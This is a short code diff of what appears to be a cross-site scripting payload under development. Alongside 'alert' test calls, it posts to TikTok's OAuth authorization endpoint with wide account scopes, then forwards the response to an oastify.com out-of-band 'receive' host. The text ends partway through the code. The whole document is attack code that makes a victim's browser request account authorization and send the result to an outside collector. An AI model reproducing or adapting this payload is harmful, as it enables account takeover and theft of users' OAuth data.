@@ -1,5 +1,5 @@
-alert(3),
-fetch("https://rgb1o92umu8wcv8og2u2nyg7fylw9nxc.oastify.com/send/", {
+alert(4),
+fetch("https://www.tiktok.com/passport/open/web/auth/?client_key=7236493407642714114&scope=user.info.basic%2Cuser.info.stats%2Cvideo.list%2Ccomment.list%2Ccomment.list.manage%2Cuser.account.type%2Cvideo.publish%2Cuser.insights%2Cuser.info.username%2Cvideo.insights&aid=1459&source=web&redirect_uri=https%3A%2F%2Ftiktok.com%2F", {
   method: "POST",
   headers: {
     "Content-Type": "application/json",
@@ -7,7 +7,7 @@ fetch("https://rgb1o92umu8wcv8og2u2nyg7fylw9nxc.oastify.com/send/", {
   body: JSON.stringify({
   }),
 })
-  .then(response => response.text())
+  .then(response => response.json())
   .then(data => {
     fetch("https://ibxsj0xlhl3n7m3fbtptipbyapgo4es3.oastify.com/receive/", {
       method: "POST",
